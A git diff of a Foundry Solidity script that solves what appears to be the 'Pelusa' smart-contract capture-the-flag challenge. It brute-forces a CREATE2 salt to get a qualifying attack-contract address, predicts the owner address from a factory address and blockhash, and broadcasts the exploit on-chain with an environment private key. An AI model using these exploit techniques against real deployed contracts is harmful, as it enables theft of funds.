@@ -6,15 +6,14 @@ import "../src/attacks/PelusaAttack.sol";
 import "../src/Pelusa.sol";
 
 contract PelusaScript is Script {
-    address public toDeployAddress;
-    uint public salt;
+    address constant PELUSA_ADDR = 0xd6c70E24559D6c965348231b061B72Edd2EAc40B;
+    address constant FACTORY_CONTRACT = 0xAA758e00ecA745Cab9232b207874999F55481951;
+    address constant PLAYER_ADDR = 0xeC09A77427caC13A598C9eD9420AA975bfE17CE9;
+    uint256 constant BLOCK_NUMBER = 7951300;
+    address constant DEPLOYER = 0x4e59b44847b379578588920cA78FbF26c0B4956C; // Refer issue - https://github.com/foundry-rs/foundry/issues/1999
 
-    address CHALLENGE_ADDR = 0xd6c70E24559D6c965348231b061B72Edd2EAc40B;
-    address PELUSA_ADDR;
     address PELUSA_OWNER;
 
-    // 2. Compute the address of the contract to be deployed
-    // NOTE: _salt is a random number used to create an address
     function getAddress(bytes memory bytecode, uint _salt)
         public
         view
@@ -23,36 +22,28 @@ contract PelusaScript is Script {
         bytes32 hash = keccak256(
             abi.encodePacked(
                 bytes1(0xff),
-                address(this),
+                DEPLOYER,
                 _salt,
                 keccak256(bytecode)
             )
         );
 
-        // NOTE: cast last 20 bytes of hash to address
         return address(uint160(uint(hash)));
     }
 
-    function checkAddress(uint from, uint to) public {
+    function findSalt(uint from, uint to) public returns (uint256) {
         bytes memory byteCode = getByteCode();
+
         for (uint i = from; i < to; i++) {
             address addr = getAddress(byteCode, i);
 
-            console.log(addr, i, uint256(uint160(addr)) % 100);
-
             if (uint256(uint160(addr)) % 100 == 10) {
-                toDeployAddress = addr;
-                salt = i;
-                break;
+                return i;
             }
         }
     }
 
-    function toAddress(bytes32 val) public pure returns (address) {
-        return address(uint160(uint256(val)));
-    }
-
-    function tryCreate2(bytes memory _code, uint _salt)
+    function createPelusaAttack(bytes memory _code, uint _salt)
         public
         returns (address)
     {
@@ -73,19 +64,26 @@ contract PelusaScript is Script {
     }
 
     function run() public {
-        Pelusa pelusa = new Pelusa();
-        PELUSA_ADDR = address(pelusa);
-        PELUSA_OWNER = address(uint160(uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number))))));
+        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
+        vm.startBroadcast(deployerPrivateKey);
 
-        checkAddress(0, 1000);
-        console.log("Final Salt %d", salt);
+        Pelusa pelusa = Pelusa(PELUSA_ADDR);
+        PELUSA_OWNER = address(uint160(uint256(keccak256(abi.encodePacked(FACTORY_CONTRACT, blockhash(BLOCK_NUMBER))))));
+
+        uint256 salt = findSalt(0, 1000);
+        console.log("Salt %d", salt);
 
         bytes memory bytecode = getByteCode();
-        address addr = tryCreate2(bytecode, salt);
+        console.log("Expected Address: ", getAddress(bytecode, salt));
+
+        address addr = createPelusaAttack(bytecode, salt);
+
+        console.log("Contract Deployed at: ", addr);
 
         PelusaAttack pelusaAttack = PelusaAttack(addr);
 
         pelusa.shoot();
-        console.log(pelusa.goals());
+        
+        vm.stopBroadcast();
     }
 }
